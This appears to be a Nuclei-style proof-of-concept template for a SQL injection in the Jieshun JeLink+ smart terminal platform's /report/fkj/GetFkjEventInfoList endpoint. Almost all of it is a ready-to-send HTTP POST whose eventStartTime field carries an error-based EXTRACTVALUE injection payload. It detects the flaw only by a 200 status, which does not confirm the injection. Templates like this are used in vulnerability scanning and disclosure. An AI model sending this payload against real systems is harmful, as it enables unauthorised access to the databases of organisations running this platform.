id: poc-arp2z45osh1mqteo
info:
  name: 捷顺JeLink+智能终端操作平台GetFkjEventInfoList存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: sqli,2025
http:
- raw:
  - 'POST /report/fkj/GetFkjEventInfoList HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36

    accept: */*

    Content-Type: application/x-www-form-urlencoded


    eventStartTime=1'' AND EXTRACTVALUE(2220,CONCAT(0x5c,0x717a787871,(SELECT (ELT(2220=2220,1))),0x7162707071)) AND ''yYVf''=''yYVf&eventEndTime=&deviceIp=&deviceName=&eventTypeName=&eventContent=&page=1&rows=20'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
